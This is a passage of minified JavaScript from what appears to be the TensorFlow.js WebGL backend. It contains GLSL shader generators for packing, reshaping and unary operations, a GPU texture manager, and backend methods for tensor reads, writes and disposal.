    const {addImpl: _F, bincountImpl: C1, bincountReduceImpl: UF, bitwiseAndImpl: YF, castImpl: QF, ceilImpl: JF, concatImpl: jF, equalImpl: qF, expImpl: tz, expm1Impl: ez, floorImpl: nz, gatherNdImpl: sz, gatherV2Impl: oz, greaterImpl: rz, greaterEqualImpl: iz, lessImpl: az, lessEqualImpl: cz, linSpaceImpl: lz, logImpl: uz, maxImpl: dz, maximumImpl: hz, minimumImpl: pz, multiplyImpl: fz, negImpl: mz, notEqualImpl: gz, prodImpl: bz, raggedGatherImpl: xz, raggedRangeImpl: yz, raggedTensorToTensorImpl: Iz, rangeImpl: wz, rsqrtImpl: Cz, scatterImpl: vz, sigmoidImpl: Sz, simpleAbsImpl: v1, sliceImpl: kz, sparseFillEmptyRowsImpl: Tz, sparseReshapeImpl: Nz, sparseSegmentReductionImpl: S1, sqrtImpl: Rz, staticRegexReplaceImpl: $z, stridedSliceImpl: Gz, stringNGramsImpl: Lz, stringSplitImpl: Ez, stringToHashBucketFastImpl: Dz, subImpl: Wz, tileImpl: Mz, topKImpl: Vz, transposeImpl: Gp, uniqueImpl: Fz} = OL;
    function k1(n, t) {
        return ["x", "y", "z", "w", "u", "v"].slice(0, t).map((e=>`${n}.${e}`))
    }
    function We(n, t) {
        return 1 === t ? [n] : k1(n, t)
    }
    class Xz {
        constructor(t) {
            if (this.variableNames = ["A"],
            this.packedInputs = !1,
            this.packedOutput = !0,
            this.outputShape = t,
            this.rank = t.length,
            this.enableShapeUniforms = Ne(this.outputShape.length),
            0 === this.rank)
                this.userCode = "\n        void main() {\n          setOutput(vec4(getA(), 0., 0., 0.));\n        }\n      ";
            else {
                const e = We("rc", this.rank)
                  , s = Wt(this.rank)
                  , o = this.getOutOfBoundsCondition(e)
                  , r = this.getSetup(e)
                  , i = this.getOutput(e);
                this.userCode = `\n        void main() {\n          ${s} rc = getOutputCoords();\n\n          if(${o}) {\n            setOutput(vec4(0));\n          } else {\n            ${r}\n\n            setOutput(vec4(${i}));\n          }\n        }\n      `
            }
        }
        getSourceCoordsArr(t) {
            const e = [];
            for (let s = 0; s <= 1; s++)
                for (let o = 0; o <= 1; o++) {
                    let r = `${0 === s ? "r" : "rp1"}, ${0 === o ? "c" : "cp1"}`;
                    for (let i = 2; i < this.rank; i++)
                        r = `${t[t.length - 1 - i]},` + r;
                    e.push(r)
                }
            return e
        }
        getOutOfBoundsCondition(t) {
            if (1 === this.rank)
                return `rc > ${this.enableShapeUniforms ? "outShape" : this.outputShape[0]}`;
            let e = "";
            for (let s = this.rank - 2; s < this.rank; s++)
                e += `${t[s]} >= ${this.enableShapeUniforms ? `outShape[${s}]` : this.outputShape[s]}`,
                s < this.rank - 1 && (e += "||");
            return e
        }
        getSetup(t) {
            if (1 === this.rank)
                return "";
            const e = t.slice(-2)
              , s = this.enableShapeUniforms ? `outShape[${this.rank} - 1]` : this.outputShape[this.rank - 1]
              , o = this.enableShapeUniforms ? `outShape[${this.rank} - 2]` : this.outputShape[this.rank - 2];
            return `\n      int r = ${e[0]};\n      int c = ${e[1]};\n      int rp1 = r + 1;\n      int cp1 = c + 1;\n\n      bool cEdge = cp1 >= ${s};\n      bool rEdge = rp1 >= ${o};\n    `
        }
        getOutput(t) {
            const e = this.getSourceCoordsArr(t);
            return 1 === this.rank ? `getA(rc), (rc + 1 >= ${this.enableShapeUniforms ? "outShape" : this.outputShape[0]} ? 0. : getA(rc + 1)), 0, 0` : `getA(${e[0]}),\n            cEdge ? 0. : getA(${e[1]}),\n            rEdge ? 0. : getA(${e[2]}),\n            rEdge || cEdge ? 0. : getA(${e[3]})`
        }
    }
    class T1 {
        constructor(t, e) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.customUniforms = [{
                name: "inputShape",
                type: "ivec3"
            }],
            this.outputShape = t,
            this.enableShapeUniforms = Ne(this.outputShape.length);
            let s = "";
            for (let o = 0; o < 4; o++) {
                let r = "thisRC = rc;";
                o % 2 == 1 && (r += "thisRC.z += 1;"),
                o > 1 && (r += "thisRC.y += 1;"),
                s += `\n        ${r}\n        ${o > 0 ? "if(thisRC.y < rows && thisRC.z < cols){" : ""}\n          int flatIndex = getFlatIndex(thisRC);\n\n          ivec3 inputRC = inputCoordsFromReshapedOutCoords(flatIndex);\n          vec2 inputRCInnerDims = vec2(float(inputRC.y),float(inputRC.z));\n\n          result[${o}] =\n            getChannel(getA(inputRC.x, inputRC.y, inputRC.z), inputRCInnerDims);\n        ${o > 0 ? "}" : ""}\n      `
            }
            this.userCode = `\n      ${function Az(n, t) {
                return `\n    ivec3 inputCoordsFromReshapedOutCoords(int index) {\n      ${t ? zV(["r", "c", "d"], "inputShape") : vo(["r", "c", "d"], n)}\n      return ivec3(r, c, d);\n    }\n  `
            }(e, this.enableShapeUniforms)}\n      ${this.enableShapeUniforms ? "\n  int getFlatIndex(ivec3 coords) {\n    return coords.x * outShapeStrides[0] + coords.y * outShapeStrides[1] + coords.z;\n  }\n" : Tp(t)}\n\n      void main() {\n        ivec3 rc = getOutputCoords();\n\n        vec4 result = vec4(0.);\n\n        ivec3 thisRC;\n        int rows = ${this.enableShapeUniforms ? "outShape[1]" : t[1]};\n        int cols = ${this.enableShapeUniforms ? "outShape[2]" : t[2]};\n\n        ${s}\n\n        setOutput(result);\n      }\n    `
        }
    }
    class Pz {
        constructor(t) {
            this.gpgpu = t,
            this.numUsedTextures = 0,
            this.numFreeTextures = 0,
            this._numBytesAllocated = 0,
            this._numBytesFree = 0,
            this.freeTextures = {},
            this.usedTextures = {},
            this.logEnabled = !1
        }
        acquireTexture(t, e, s) {
            const o = R1(e, s)
              , r = $1(t, o, s);
            r in this.freeTextures || (this.freeTextures[r] = []),
            r in this.usedTextures || (this.usedTextures[r] = []);
            const i = N1(t, o, this.gpgpu.gl, this.gpgpu.textureConfig, s);
            if (this.freeTextures[r].length > 0) {
                this.numFreeTextures--,
                this.numUsedTextures++,
                this._numBytesFree -= i,
                this.log();
                const c = this.freeTextures[r].pop();
                return this.usedTextures[r].push(c),
                c
            }
            let a;
            return o === we.PACKED_2X2_FLOAT32 ? a = this.gpgpu.createPackedMatrixTexture(t[0], t[1]) : o === we.PACKED_2X2_FLOAT16 ? a = this.gpgpu.createFloat16PackedMatrixTexture(t[0], t[1]) : o === we.UNPACKED_FLOAT32 ? a = this.gpgpu.createFloat32MatrixTexture(t[0], t[1]) : o === we.UNPACKED_FLOAT16 ? a = this.gpgpu.createFloat16MatrixTexture(t[0], t[1]) : o === we.PACKED_4X1_UNSIGNED_BYTE && (a = this.gpgpu.createUnsignedBytesMatrixTexture(t[0], t[1])),
            this.usedTextures[r].push(a),
            this.numUsedTextures++,
            this._numBytesAllocated += i,
            this.log(),
            a
        }
        releaseTexture(t, e, s, o) {
            if (null == this.freeTextures)
                return;
            const r = R1(s, o)
              , i = $1(e, r, o);
            i in this.freeTextures || (this.freeTextures[i] = []);
            const a = N1(e, r, this.gpgpu.gl, this.gpgpu.textureConfig, o)
              , c = z().getNumber("WEBGL_DELETE_TEXTURE_THRESHOLD");
            -1 !== c && this._numBytesAllocated > c ? (this.gpgpu.deleteMatrixTexture(t.texture),
            this._numBytesAllocated -= a) : (this.freeTextures[i].push(t),
            this.numFreeTextures++,
            this._numBytesFree += a),
            this.numUsedTextures--;
            const l = this.usedTextures[i]
              , u = l && l.indexOf(t);
            if (null == u || u < 0)
                throw new Error("Cannot release a texture that was never provided by this texture manager");
            l[u] = l[l.length - 1],
            l.pop(),
            this.log()
        }
        log() {
            if (!this.logEnabled)
                return;
            const t = this.numFreeTextures + this.numUsedTextures;
            console.log("Free/Used", `${this.numFreeTextures} / ${this.numUsedTextures}`, `(${t})`);
            const e = this._numBytesFree / this._numBytesAllocated;
            console.log(`Bytes allocated: ${this._numBytesAllocated}`),
            console.log(`Bytes unused: ${this._numBytesFree} (${Math.round(100 * e)}%)`)
        }
        get numBytesAllocated() {
            return this._numBytesAllocated
        }
        get numBytesFree() {
            return this._numBytesFree
        }
        getNumUsedTextures() {
            return this.numUsedTextures
        }
        getNumFreeTextures() {
            return this.numFreeTextures
        }
        dispose() {
            if (null != this.freeTextures) {
                for (const t in this.freeTextures)
                    this.freeTextures[t].forEach((e=>{
                        this.gpgpu.deleteMatrixTexture(e.texture)
                    }
                    ));
                for (const t in this.usedTextures)
                    this.usedTextures[t].forEach((e=>{
                        this.gpgpu.deleteMatrixTexture(e.texture)
                    }
                    ));
                this.freeTextures = null,
                this.usedTextures = null,
                this.numUsedTextures = 0,
                this.numFreeTextures = 0,
                this._numBytesAllocated = 0,
                this._numBytesFree = 0
            }
        }
    }
    function N1(n, t, e, s, o) {
        const r = function Kz(n, t) {
            switch (n) {
            case we.PACKED_2X2_FLOAT32:
                return I1(t);
            case we.PACKED_2X2_FLOAT16:
                return w1(t);
            case we.UNPACKED_FLOAT32:
                return b1(t);
            case we.UNPACKED_FLOAT16:
                return x1(t);
            case we.PACKED_4X1_UNSIGNED_BYTE:
                return y1(t);
            default:
                throw new Error(`Unknown physical texture type ${n}`)
            }
        }(t, s);
        let i;
        if (o) {
            const [c,l] = lr(n[0], n[1]);
            i = c * l
        } else {
            const [c,l] = oa(n[0], n[1]);
            i = c * l
        }
        const a = function Oz(n, t) {
            const e = n;
            if (t === e.R32F)
                return 4;
            if (t === e.R16F)
                return 2;
            if (t === e.RGBA32F)
                return 16;
            if (t === n.RGBA)
                return 16;
            if (t === e.RGBA16F)
                return 8;
            if (t === e.RGBA8)
                return 4;
            throw new Error(`Unknown internal format ${t}`)
        }(e, r);
        return i * a
    }
    function R1(n, t) {
        if (n === an.UPLOAD)
            return we.PACKED_2X2_FLOAT32;
        if (n === an.RENDER || null == n)
            return function Zz(n) {
                return z().getBool("WEBGL_RENDER_FLOAT32_ENABLED") ? n ? we.PACKED_2X2_FLOAT32 : we.UNPACKED_FLOAT32 : n ? we.PACKED_2X2_FLOAT16 : we.UNPACKED_FLOAT16
            }(t);
        if (n === an.DOWNLOAD || n === an.PIXELS)
            return we.PACKED_4X1_UNSIGNED_BYTE;
        throw new Error(`Unknown logical texture type ${n}`)
    }
    function $1(n, t, e) {
        return `${n[0]}_${n[1]}_${t}_${e}`
    }
    class jn {
        constructor(t, e) {
            this.variableNames = ["A"],
            this.outputShape = t,
            this.enableShapeUniforms = Ne(this.outputShape.length),
            this.userCode = `\n      float unaryOperation(float x) {\n        ${e}\n      }\n\n      void main() {\n        float x = getAAtOutCoords();\n        float y = unaryOperation(x);\n\n        setOutput(y);\n      }\n    `
        }
    }
    const Cn = "if (isnan(x)) return x;"
      , Bz = "return x;"
      , G1 = "return abs(x);"
      , Hz = "return (x >= 0.0) ? x : (exp(x) - 1.0);"
      , _z = Cn + "\n  return (x < 0.0) ? 0.0 : x;\n"
      , Uz = Cn + "\n  return (x < 0.0) ? 0.0 : min(6.0, x);\n"
      , Vs = "return x;"
      , Yz = "return 1.0 / (1.0 + exp(-1.0 * x));"
      , Qz = "return x;"
      , Jz = "\n  vec4 result;\n\n  result.r = (x.r >= 0.0) ? x.r : (exp(x.r) - 1.0);\n  result.g = (x.g >= 0.0) ? x.g : (exp(x.g) - 1.0);\n  result.b = (x.b >= 0.0) ? x.b : (exp(x.b) - 1.0);\n  result.a = (x.a >= 0.0) ? x.a : (exp(x.a) - 1.0);\n\n  return result;\n"
      , jz = "\n  vec4 result = x * vec4(greaterThanEqual(x, vec4(0.0)));\n  bvec4 isNaN = isnan(x);\n\n  result.r = isNaN.r ? x.r : result.r;\n  result.g = isNaN.g ? x.g : result.g;\n  result.b = isNaN.b ? x.b : result.b;\n  result.a = isNaN.a ? x.a : result.a;\n\n  return result;\n"
      , qz = "\n  vec4 result = min(x, vec4(6.)) * vec4(greaterThanEqual(x, vec4(0.0)));\n  bvec4 isNaN = isnan(x);\n\n  result.r = isNaN.r ? x.r : result.r;\n  result.g = isNaN.g ? x.g : result.g;\n  result.b = isNaN.b ? x.b : result.b;\n  result.a = isNaN.a ? x.a : result.a;\n\n  return result;\n"
      , tX = "return 1.0 / (1.0 + exp(-1.0 * x));";
    class Fs {
        constructor(t, e) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !0,
            this.outputShape = t,
            this.enableShapeUniforms = Ne(this.outputShape.length),
            this.userCode = `\n      vec4 unaryOperation(vec4 x) {\n        ${e}\n      }\n\n      void main() {\n        vec4 x = getAAtOutCoords();\n        vec4 y = unaryOperation(x);\n\n        setOutput(y);\n      }\n    `
        }
    }
    class eX {
        constructor(t) {
            this.variableNames = ["A"],
            this.packedInputs = !0,
            this.packedOutput = !1,
            this.outputShape = t,
            this.enableShapeUniforms = Ne(this.outputShape.length);
            const e = t.length
              , s = We("rc", e)
              , o = Wt(e)
              , r = function zz(n, t) {
                if (1 === n)
                    return "rc";
                let e = "";
                for (let s = 0; s < n; s++)
                    e += t[s],
                    s < n - 1 && (e += ",");
                return e
            }(e, s)
              , i = s.slice(-2)
              , a = e <= 1 ? "rc" : `vec2(${i.join(",")})`;
            this.userCode = `\n      void main() {\n        ${o} rc = getOutputCoords();\n        vec4 packedInput = getA(${r});\n\n        setOutput(getChannel(packedInput, ${a}));\n      }\n    `
        }
    }
    const nX = rg
      , Nl = {};
    const iX = z().getNumber("CPU_HANDOFF_SIZE_THRESHOLD");
    class Rl extends Zl {
        nextDataId() {
            return Rl.nextDataId++
        }
        constructor(t) {
            if (super(),
            this.pendingRead = new WeakMap,
            this.pendingDisposal = new WeakSet,
            this.dataRefCount = new WeakMap,
            this.numBytesInGPU = 0,
            this.uploadWaitMs = 0,
            this.downloadWaitMs = 0,
            this.lastGlFlushTime = 0,
            this.warnedAboutMemory = !1,
            this.pendingDeletes = 0,
            this.disposed = !1,
            !z().getBool("HAS_WEBGL"))
                throw new Error("WebGL is not supported on this device");
            let e;
            if (null != t) {
                if (t instanceof $p)
                    e = t;
                else {
                    const s = Mn(z().getNumber("WEBGL_VERSION"), t);
                    e = new $p(s)
                }
                this.binaryCache = {},
                this.gpgpuCreatedLocally = !1
            } else {
                const s = Mn(z().getNumber("WEBGL_VERSION"));
                e = new $p(s),
                this.binaryCache = function rX(n) {
                    return n in Nl || (Nl[n] = {}),
                    Nl[n]
                }(z().getNumber("WEBGL_VERSION")),
                this.gpgpuCreatedLocally = !0
            }
            this.gpgpu = e,
            this.canvas = this.gpgpu.gl.canvas,
            this.textureManager = new Pz(this.gpgpu),
            this.numMBBeforeWarning = function cX() {
                return null == z().global.screen ? 1024 : z().global.screen.height * z().global.screen.width * window.devicePixelRatio * 600 / 1024 / 1024
            }(),
            this.texData = new lf(this,zt())
        }
        numDataIds() {
            return this.texData.numDataIds() - this.pendingDeletes
        }
        writeTexture(t, e, s, o, r, i) {
            const a = this.makeTensorInfo(e, s)
              , c = this.texData.get(a.dataId);
            c.isPacked = !1,
            c.texture = {
                texture: t,
                texShape: [o, r]
            },
            c.texShape = [o, r];
            const l = vl(e)
              , u = new g1(l,!1,i)
              , d = this.runWebGLProgram(u, [a], s, [[o, r]]);
            return d.shape = e,
            c.texture = null,
            this.disposeIntermediateTensorInfo(a),
            d.dataId
        }
        write(t, e, s) {
            if ((z().getBool("WEBGL_CHECK_NUMERICAL_PROBLEMS") || z().getBool("DEBUG")) && this.checkNumericalProblems(t),
            "complex64" === s && null != t)
                throw new Error("Cannot write to a complex64 dtype. Please use tf.complex(real, imag).");
            const o = {
                id: this.nextDataId()
            };
            return this.texData.set(o, {
                shape: e,
                dtype: s,
                values: t,
                usage: an.UPLOAD,
                refCount: 1
            }),
            o
        }
        refCount(t) {
            return this.texData.has(t) ? this.texData.get(t).refCount : 0
        }
        incRef(t) {
            this.texData.get(t).refCount++
        }
        decRef(t) {
            if (this.texData.has(t)) {
                this.texData.get(t).refCount--
            }
        }
        move(t, e, s, o, r) {
            if (z().getBool("DEBUG") && this.checkNumericalProblems(e),
            "complex64" === o)
                throw new Error("Cannot write to a complex64 dtype. Please use tf.complex(real, imag).");
            this.texData.set(t, {
                shape: s,
                dtype: o,
                values: e,
                usage: an.UPLOAD,
                refCount: r
            })
        }
        disposeIntermediateTensorInfo(t) {
            this.disposeData(t.dataId)
        }
        readSync(t) {
            const e = this.texData.get(t)
              , {values: s, dtype: o, complexTensorInfos: r, slice: i, shape: a, isPacked: c} = e;
            if (null != i) {
                let h;
                h = c ? new Fs(a,Vs) : new jn(a,Vs);
                const p = this.runWebGLProgram(h, [{
                    dataId: t,
                    shape: a,
                    dtype: o
                }], o)
                  , f = this.readSync(p.dataId);
                return this.disposeIntermediateTensorInfo(p),
                f
            }
            if (null != s)
                return this.convertAndCacheOnCPU(t);
            if ("string" === o)
                return s;
            const l = null != this.activeTimers;
            let u, d;
            if (l && (u = Ve()),
            "complex64" === o) {
                d = as(this.readSync(r.real.dataId), this.readSync(r.imag.dataId))
            } else
                d = this.getValuesFromTexture(t);
            return l && (this.downloadWaitMs += Ve() - u),
            this.convertAndCacheOnCPU(t, d)
        }
        async read(t) {
            if (this.pendingRead.has(t)) {
                const f = this.pendingRead.get(t);
                return new Promise((m=>f.push(m)))
            }
            const e = this.texData.get(t)
              , {values: s, shape: o, slice: r, dtype: i, complexTensorInfos: a, isPacked: c} = e;
            if (null != r) {
                let f;
                f = c ? new Fs(o,Vs) : new jn(o,Vs);
                const m = this.runWebGLProgram(f, [{
                    dataId: t,
                    shape: o,
                    dtype: i
                }], i)
                  , g = this.read(m.dataId);
                return this.disposeIntermediateTensorInfo(m),
                g
            }
            if (null != s)
                return this.convertAndCacheOnCPU(t);
            if (z().getBool("DEBUG") && !z().getBool("WEBGL_DOWNLOAD_FLOAT_ENABLED") && 2 === z().getNumber("WEBGL_VERSION"))
                throw new Error("tensor.data() with WEBGL_DOWNLOAD_FLOAT_ENABLED=false and WEBGL_VERSION=2 not yet supported.");
            let u, d, l = null;
            if ("complex64" !== i && z().get("WEBGL_BUFFER_SUPPORTED")) {
                u = this.decode(t);
                const f = this.texData.get(u.dataId);
                l = this.gpgpu.createBufferFromTexture(f.texture.texture, ...Il(o))
            }
            if (this.pendingRead.set(t, []),
            "complex64" !== i && await this.gpgpu.createAndWaitForFence(),
            "complex64" === i) {
                const f = await Promise.all([this.read(a.real.dataId), this.read(a.imag.dataId)]);
                d = as(f[0], f[1])
            } else if (null == l)
                d = this.getValuesFromTexture(t);
            else {
                const f = Z(o);
                d = this.gpgpu.downloadFloat32MatrixFromBuffer(l, f)
            }
            if (null != u && this.disposeIntermediateTensorInfo(u),
            null != l) {
                const f = this.gpgpu.gl;
                ot(f, (()=>f.deleteBuffer(l)))
            }
            const h = this.convertAndCacheOnCPU(t, d)
              , p = this.pendingRead.get(t);
            return this.pendingRead.delete(t),
            p.forEach((f=>f(h))),
            this.pendingDisposal.has(t) && (this.pendingDisposal.delete(t),
            this.disposeData(t) && zt().removeDataId(t, this),
            this.pendingDeletes--),
            h
        }
        readToGPU(t, e={}) {
            const s = this.texData.get(t)
              , {values: o, shape: r, slice: i, dtype: a, isPacked: c, texture: l} = s;
            if ("complex64" === a)
                throw new Error("Does not support reading texture for complex64 dtype.");
            if (null != i) {
                let p;
                p = c ? new Fs(r,Vs) : new jn(r,Vs);
                const f = this.runWebGLProgram(p, [{
                    dataId: t,
                    shape: r,
                    dtype: a
                }], a)
                  , m = this.readToGPU(f, e);
                return this.disposeIntermediateTensorInfo(f),
                m
            }
            if (null == l)
                throw null != o ? new Error("Data is not on GPU but on CPU.") : new Error("There is no data on GPU or CPU.");
            const u = this.decode(t, e.customTexShape)
              , d = zt().makeTensorFromTensorInfo(u)
              , h = this.texData.get(u.dataId);
            return Object.assign({
                tensorRef: d
            }, h.texture)
        }
        bufferSync(t) {
            const e = this.readSync(t.dataId);
            if ("string" === t.dtype)
                try {
                    const s = e.map((o=>xs(o)));
                    return wt(t.shape, t.dtype, s)
                } catch {
                    throw new Error("Failed to decode encoded string bytes into utf-8")
                }
            return wt(t.shape, t.dtype, e)
        }
        checkNumericalProblems(t) {
            if (null != t)
                for (let e = 0; e < t.length; e++) {
                    const s = t[e];
                    if (!dV(s))
                        throw z().getBool("WEBGL_RENDER_FLOAT32_CAPABLE") ? Error(`The value ${s} cannot be represented with your current settings. Consider enabling float32 rendering: 'tf.env().set('WEBGL_RENDER_FLOAT32_ENABLED', true);'`) : Error(`The value ${s} cannot be represented on this device.`)
                }
        }
        getValuesFromTexture(t) {
            const {shape: e, dtype: s, isPacked: o} = this.texData.get(t)
              , r = Z(e);
            if (z().getBool("WEBGL_DOWNLOAD_FLOAT_ENABLED")) {
                const h = this.decode(t)
                  , p = this.texData.get(h.dataId)
                  , f = this.gpgpu.downloadMatrixFromPackedTexture(p.texture.texture, ...Il(e)).subarray(0, r);
                return this.disposeIntermediateTensorInfo(h),
                f
            }
            const i = z().getBool("WEBGL_PACK") && !0 === o
              , a = i ? vl(e) : e
              , c = i ? new NF(a) : new TF(a)
              , l = this.runWebGLProgram(c, [{
                shape: a,
                dtype: s,
                dataId: t
            }], "float32")
              , u = this.texData.get(l.dataId)
              , d = this.gpgpu.downloadByteEncodedFloatMatrixFromOutputTexture(u.texture.texture, u.texShape[0], u.texShape[1]).subarray(0, r);
            return this.disposeIntermediateTensorInfo(l),
            d
        }
        timerAvailable() {
            return z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_RELIABLE") > 0
        }
        time(t) {
            const e = this.activeTimers
              , s = [];
            let o = !1;
            null == this.programTimersStack ? (this.programTimersStack = s,
            o = !0) : this.activeTimers.push(s),
            this.activeTimers = s,
            t();
            const r = Qs(this.activeTimers.map((c=>c.query))).filter((c=>null != c))
              , i = Qs(this.activeTimers.map((c=>c.name))).filter((c=>null != c));
            this.activeTimers = e,
            o && (this.programTimersStack = null);
            const a = {
                uploadWaitMs: this.uploadWaitMs,
                downloadWaitMs: this.downloadWaitMs,
                kernelMs: null,
                wallMs: null
            };
            return (async()=>{
                if (z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_RELIABLE") > 0) {
                    const c = await Promise.all(r);
                    a.kernelMs = function qI(n) {
                        let t = 0;
                        for (let e = 0; e < n.length; e++)
                            t += n[e];
                        return t
                    }(c),
                    a.getExtraProfileInfo = ()=>c.map(((l,u)=>({
                        name: i[u],
                        ms: l
                    }))).map((l=>`${l.name}: ${l.ms}`)).join(", ")
                } else
                    a.kernelMs = {
                        error: "WebGL query timers are not supported in this environment."
                    };
                return this.uploadWaitMs = 0,
                this.downloadWaitMs = 0,
                a
            }
            )()
        }
        memory() {
            return {
                unreliable: !1,
                numBytesInGPU: this.numBytesInGPU,
                numBytesInGPUAllocated: this.textureManager.numBytesAllocated,
                numBytesInGPUFree: this.textureManager.numBytesFree
            }
        }
        startTimer() {
            return z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_RELIABLE") > 0 ? this.gpgpu.beginQuery() : {
                startMs: Ve(),
                endMs: null
            }
        }
        endTimer(t) {
            return z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_RELIABLE") > 0 ? (this.gpgpu.endQuery(),
            t) : (t.endMs = Ve(),
            t)
        }
        async getQueryTime(t) {
            if (z().getNumber("WEBGL_DISJOINT_QUERY_TIMER_EXTENSION_RELIABLE") > 0)
                return this.gpgpu.waitForQueryAndGetTime(t);
            const e = t;
            return e.endMs - e.startMs
        }
        disposeData(t, e=!1) {
            if (this.pendingDisposal.has(t))
                return !1;
            if (!this.texData.has(t))
                return !0;
            if (e ? this.texData.get(t).refCount = 0 : this.texData.get(t).refCount--,
            !e && this.texData.get(t).refCount > 0)
                return !1;
            if (this.pendingRead.has(t))
                return this.pendingDisposal.add(t),
                this.pendingDeletes++,
                !1;
            this.releaseGPUData(t);
            const {complexTensorInfos: s} = this.texData.get(t);
            return null != s && (this.disposeData(s.real.dataId, e),
            this.disposeData(s.imag.dataId, e)),
            this.texData.delete(t),
            !0
        }
        releaseGPUData(t) {
            const {texture: e, dtype: s, texShape: o, usage: r, isPacked: i, slice: a} = this.texData.get(t)
              , c = a && a.origDataId || t
              , l = this.dataRefCount.get(c);
            l > 1 ? this.dataRefCount.set(c, l - 1) : (this.dataRefCount.delete(c),
            null != e && (this.numBytesInGPU -= this.computeBytes(o, s),
            this.textureManager.releaseTexture(e, o, r, i)));
            const u = this.texData.get(t);
            u.texture = null,
            u.texShape = null,
            u.isPacked = !1,
            u.slice = null
        }
        getTexture(t) {
            return this.uploadToGPU(t),
            this.texData.get(t).texture.texture
        }
        getDataInfo(t) {
            return this.texData.get(t)
        }
        shouldExecuteOnCPU(t, e=iX) {
            return z().getBool("WEBGL_CPU_FORWARD") && t.every((s=>null == this.texData.get(s.dataId).texture && Z(s.shape) < e))
        }
        getGPGPUContext() {
            return this.gpgpu
        }
        where(t) {
            je("tf.where() in webgl locks the UI thread. Call tf.whereAsync() instead");
            const e = t.dataSync();
            return nX(t.shape, e)
        }
        packedUnaryOp(t, e, s) {
            const o = new Fs(t.shape,e)
              , r = this.compileAndRun(o, [t], s);
            return zt().makeTensorFromTensorInfo(r)
        }
        abs(t) {
            if (this.shouldExecuteOnCPU([t]) && "complex64" !== t.dtype) {
                const o = v1(this.texData.get(t.dataId).values);
                return this.makeOutput(t.shape, t.dtype, o)
            }
            if (z().getBool("WEBGL_PACK_UNARY_OPERATIONS"))
                return this.packedUnaryOp(t, G1, t.dtype);
            const e = new jn(t.shape,G1)
              , s = this.compileAndRun(e, [t]);
            return zt().makeTensorFromTensorInfo(s)
        }
        makeTensorInfo(t, e, s) {
            let o;
            if ("string" === e && null != s && s.length > 0 && Cr(s[0])) {
                const r = s.map((i=>bs(i)));
                o = this.write(r, t, e)
            } else
                o = this.write(s, t, e);
            return this.texData.get(o).usage = null,
            {
                dataId: o,
                shape: t,
                dtype: e
            }
        }
        makeOutput(t, e, s) {
            return zt().makeTensorFromTensorInfo(this.makeTensorInfo(t, e, s), this)
        }
        unpackTensor(t) {
            const e = new eX(t.shape);
            return this.runWebGLProgram(e, [t], t.dtype)
        }
        packTensor(t) {
            const e = new Xz(t.shape);
            return this.runWebGLProgram(e, [t], t.dtype, null, !0)
        }
        packedReshape(t, e) {
            const s = [ur(t.shape), ...dr(t.shape)]
              , o = {
                dtype: t.dtype,
                shape: s,
                dataId: t.dataId
            }
              , r = [ur(e), ...dr(e)]
              , i = new T1(r,s)
              , c = [s]
              , l = this.runWebGLProgram(i, [o], t.dtype, c, !0);
            return {
                dataId: l.dataId,
                shape: e,
                dtype: l.dtype
            }
        }
        decode(t, e) {
            const s = this.texData.get(t)
              , {isPacked: o, shape: r, dtype: i} = s;
            if (null != e) {
                v(Z(r) <= e[0] * e[1] * 4, (()=>"customTexShape is too small. Row * Column * 4 should be equal or larger than the size of the tensor data."))
            }
            const a = vl(r);
            let c;
            c = o ? new kF(a) : new SF(a);
            const u = [e ?? Il(a)];
            return {
                dtype: i,
                shape: r,
                dataId: this.runWebGLProgram(c, [{
                    shape: a,
                    dtype: i,
                    dataId: t
                }], i, u, !0, e).dataId
            }
        }
        runWebGLProgram(t, e, s, o, r=!1, i) {
            const a = this.makeTensorInfo(t.outputShape, s)
              , c = this.texData.get(a.dataId);
            if (t.packedOutput && (c.isPacked = !0),
            t.outPackingScheme === sa.DENSE) {
                const b = i ?? Il(t.outputShape);
                c.texShape = b.map((x=>2 * x))
            }
            if (null != t.outTexUsage && (c.usage = t.outTexUsage),
            0 === Z(a.shape))
                return c.values = Se(a.dtype, 0),
                a;
            const l = []
              , u = e.map((b=>{
                if ("complex64" === b.dtype)
                    throw new Error("GPGPUProgram does not support complex64 input. For complex64 dtypes, please separate the program into real and imaginary parts.");
                let x = this.texData.get(b.dataId);
                if (null == x.texture) {
                    if (!t.packedInputs && Z(b.shape) <= z().getNumber("WEBGL_SIZE_UPLOAD_UNIFORM"))
                        return {
                            shape: b.shape,
                            texData: null,
                            isUniform: !0,
                            uniformValues: x.values
                        };
                    t.packedInputs && (x.isPacked = !0,
                    x.shape = b.shape)
                }
                if (this.uploadToGPU(b.dataId),
                !!x.isPacked != !!t.packedInputs)
                    b = x.isPacked ? this.unpackTensor(b) : this.packTensor(b),
                    l.push(b),
                    x = this.texData.get(b.dataId);
                else if (x.isPacked && !kl(x.shape, b.shape)) {
                    const I = b
                      , y = b.shape;
                    b.shape = x.shape,
                    b = this.packedReshape(b, y),
                    l.push(b),
                    x = this.texData.get(b.dataId),
                    I.shape = y
                }
                return {
                    shape: b.shape,
                    texData: x,
                    isUniform: !1
                }
            }
            ));
            this.uploadToGPU(a.dataId);
            const d = {
                shape: a.shape,
                texData: c,
                isUniform: !1
            }
              , h = function vF(n, t, e) {
                let s = "";
                t.concat(e).forEach((i=>{
                    const a = null != i.texData && null != i.texData.slice && i.texData.slice.flatOffset > 0;
                    if (n.enableShapeUniforms && !i.isUniform) {
                        const c = i.texData.texShape
                          , {useSqueezeShape: l, uniformShape: u, keptDims: d} = Rp(n.packedInputs, i.shape, c);
                        let h = ""
                          , p = ""
                          , f = "";
                        if (1 === u.length && n.packedInputs) {
                            const w = [Math.ceil(c[0] / 2), Math.ceil(c[1] / 2)];
                            h = `${w[0] > 1}_${w[1] > 1}`
                        } else if (2 !== u.length || n.packedInputs) {
                            if (u.length > 2 && !n.packedInputs) {
                                const w = ct(u);
                                f = `${w[0] === c[1]}_${w[w.length - 1] === c[1]}`
                            }
                        } else
                            p = `${u[0] > 1}_${u[1] > 1}`;
                        const m = i.shape.length
                          , g = 2 === u.length && Rt(i.shape, c)
                          , b = 1 === Z(i.shape)
                          , x = Uo(i.shape, e.shape)
                          , I = !n.packedInputs && m === e.shape.length && Rt(c, e.texData.texShape)
